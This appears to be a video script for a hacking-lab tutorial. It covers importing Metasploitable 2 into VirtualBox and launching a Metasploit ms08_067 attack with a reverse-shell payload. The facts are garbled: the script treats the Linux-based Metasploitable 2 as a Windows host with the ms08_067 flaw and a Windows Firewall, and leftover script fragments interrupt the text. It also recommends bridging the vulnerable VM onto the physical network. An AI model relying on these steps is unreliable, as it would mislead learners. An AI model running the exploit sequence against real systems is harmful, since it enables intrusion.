[HOOK TRANSITION]

Alright, let's get into it. The first thing you need is the image. You cannot just Google 'Metasploitable 2 download' and expect a simple .iso file. That is a common mistake. You need a specific VMware image, usually in .vmx or .vmdk format. Once you have that file, open VirtualBox. Go to 'File', then 'Import Appliance'. Browse to where you saved that file. Click 'Next'. VirtualBox will read the settings. You might notice the disk size is huge, maybe 20 or 30 gigabytes. That is normal. Just click 'Import'.

Now, here is the part most people get wrong. By default, the network adapter in VirtualBox is set to 'NAT'. This means your Metasploitable 2 can access the internet, but Kali Linux cannot see it on the local network. For hacking labs, we need 'Bridged Adapter'. Go to the Settings of your new VM, click 'Network', and change 'Attached to' from NAT to Bridged Adapter. Make sure you select your actual physical network adapter from the dropdown menu. This is the step that fixes 90% of connection issues. Without this, Metasploitable 2 is invisible to Kali.

Click 'OK', and start the virtual machine. It will boot up. You will see a login prompt. The default username is 'msfadmin' and the password is 'msfadmin'. Type those in. You are now inside the vulnerable operating system.

But wait, we need to know its IP address so Kali can talk to it. In Metasploitable, type 'ifconfig'. Look for the interface, usually eth0. You will see an IP address. Write that down. That is the target.

Now, switch over to your Kali Linux terminal. We need to ping this IP to confirm the connection is working. Type 'ping <IP_ADDRESS_FROM_IFCONFIG>'. If you see replies, you have succeeded. If you see 'Destination Host Unreachable', go back to VirtualBox settings and make sure that Bridged Adapter is selected correctly and that the correct physical adapter is chosen. This simple ping test is the final check the title promised.

Alright, you have the ping working. That means your network is configured. Now, let's talk about the metaphor for this whole process. Now, let's launch an exploit. In Kali, open the terminal and type 'msfconsole'. This launches the Metasploit Framework. It is a huge database of exploits. To find one for Metasploitable 2, type 'search ms08_067'. This is a famous vulnerability in the Windows Server service. Metasploitable 2 has it installed by default. You will see a list of results. You want the one marked as 'unpatched' or 'native', usually listed as 'exploit/windows/smb/ms08_067'. Select that one by typing its number or copying the full path.

Now, we need to set up the target. Type 'set RHOST <IP_ADDRESS_FROM_IFCONFIG>'. This is the IP we got from the ifconfig command earlier. Next, type 'set RPORT 445'. This is the port the vulnerability uses. Now, check the available payloads by typing 'show payloads'. For this exploit, a common and safe educational payload is 'set PAYLOAD windows/shell_reverse_tcp'. Then, type 'set LHOST <KALI_IP_ADDRESS>' to set your attacking machine's IP. Finally, type 'exploit'.

[COMMON MISTAKES / PRO TIPS]

Now, I know what some of you are thinking. 'Why is this so old? Why not just use a newer machine?' That is a great question. The reason we use Metasploitable 2 is that it is intentionally vulnerable. Newer operating systems patch these holes. By using an old machine, we see the exact code path of the exploit. We see how a buffer overflow works in real-time. It is like learning to swim in a shallow pool before the deep end.

A common myth is that you need the latest version of Kali to do this. Not true. Even an older version of Kali will work, as long as the Metasploit framework is updated. **A critical mistake is forgetting to update Metasploit itself. Before you start, type 'msfupdate' in the terminal to ensure you have the latest exploit modules.** Another mistake is forgetting to take a snapshot. In VirtualBox, go to 'Machine', then 'Take Snapshot'. Name it 'Clean Install'. If you mess up the configuration or accidentally break the OS, you can just revert to that snapshot. It saves hours of frustration.

Also, a frequent issue is the Windows Firewall. By default, Metasploitable 2's Windows instance may block the incoming reverse shell connection from Kali. Before launching the exploit, ensure the Windows Firewall is disabled or allows incoming connections on port 445. If the exploit runs but you get no shell, this is the first thing to check.
